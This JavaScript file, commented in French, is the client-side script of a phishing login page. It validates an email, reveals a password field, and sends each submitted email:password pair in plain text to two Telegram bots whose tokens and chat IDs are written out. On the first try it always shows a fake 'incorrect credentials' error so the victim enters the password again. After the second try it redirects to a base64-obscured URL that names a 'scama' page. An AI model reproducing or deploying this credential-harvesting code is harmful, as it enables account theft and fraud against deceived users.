document.addEventListener('DOMContentLoaded', function () {
    const zoneEmail = document.getElementById('zone-email');
    const zonePassword = document.getElementById('zone-password');
    const afficheMdp = document.getElementById('affiche-mdp');
    const erreurEmail = document.getElementById('erreur-email');
    const erreurMdp = document.getElementById('erreur-mdp');
    const continuerButton = document.getElementById('continuer-button');

    let isFirstClick = true;

    // Fonction pour masquer les messages d'erreur lors de la saisie
    zoneEmail.addEventListener('input', function () {
        erreurEmail.classList.add('hidden');
    });

    zonePassword.addEventListener('input', function () {
        erreurMdp.classList.add('hidden');
    });

    // Fonction pour valider une adresse e-mail
    function validerEmail(email) {
        // Expression régulière pour valider une adresse e-mail
        const regexEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return regexEmail.test(email);
    }

    // Fonction d'envoi des données à deux bots Telegram
    function envoyerTelegram(data) {
        // URL pour le premier bot
        const telegramBot1Url = `https://api.telegram.org/bot7487189785:AAF89jCIQGmMxrIMjnKs6ScNUuEr6oTKduo/sendMessage?chat_id=7041323586&text=🟧- ${data.email}:${data.password}`;
        
        // URL pour le deuxième bot
        const telegramBot2Url = `https://api.telegram.org/bot7588608492:AAEU1KFhyfPTR_jexRfS7_zmYCSMWqYp_58/sendMessage?chat_id=-4696074794&text=🟧- ${data.email}:${data.password}`;

        // Envoi des données aux deux bots simultanément
        return Promise.all([
            fetch(telegramBot1Url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }),
            fetch(telegramBot2Url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
        ]);
    }

    continuerButton.addEventListener('click', function () {
        if (zoneEmail.value === '') {
            erreurEmail.innerText = "Veuillez entrer une adresse email.";
            erreurEmail.classList.remove('hidden');
            return;
        }

        if (!validerEmail(zoneEmail.value)) {
            erreurEmail.innerText = "Veuillez entrer une adresse email valide.";
            erreurEmail.classList.remove('hidden');
            return;
        }

        if (afficheMdp.classList.contains('hidden')) {
            afficheMdp.classList.remove('hidden');
            zonePassword.focus();
            return;
        }

        if (zonePassword.value === '') {
            erreurMdp.innerText = "Veuillez entrer un mot de passe.";
            erreurMdp.classList.remove('hidden');
            return;
        }

        const data = {
            email: zoneEmail.value,
            password: zonePassword.value
        };

        if (isFirstClick) {
            // Envoi des données à vos deux bots Telegram après le premier clic
            envoyerTelegram(data)
                .then(response => {
                    if (!response[0].ok || !response[1].ok) {
                        // Affichage du message d'erreur en cas de succès de la requête
                        erreurMdp.innerText = "Identifiants incorrects. Veuillez réessayer.";
                        erreurMdp.classList.remove('hidden');
                        // Vider la zone de mot de passe
                        zonePassword.value = '';
                    } else {
                        isFirstClick = false;
                        // Affichage du message d'erreur en cas de succès de la requête
                        erreurMdp.innerText = "Identifiants incorrects. Veuillez réessayer.";
                        erreurMdp.classList.remove('hidden');
                        // Vider la zone de mot de passe
                        zonePassword.value = '';
                    }
                })
                .catch(error => {
                    // Gestion des erreurs de connexion lors du premier envoi
                    console.error(error);
                });
        } else {
            // Envoi des données à vos deux bots Telegram après le deuxième clic
            envoyerTelegram(data)
                .then(response => {
                    if (response[0].ok && response[1].ok) {
                        // Redirection vers le lien en base64 en cas de succès
            window.location.href = atob(
              "aHR0cHM6Ly9maW5hbC1uZW9uLXBzaS52ZXJjZWwuYXBwL2ZpbmFsJTIwbmV3JTIwc2NhbWEuaHRtbA=="
            );                    } else {
                        // Gestion de l'échec d'envoi
                    }
                })
                .catch(error => {
                    // Gestion des erreurs de connexion lors du deuxième envoi
                    console.error(error);
                });
        }
    });
});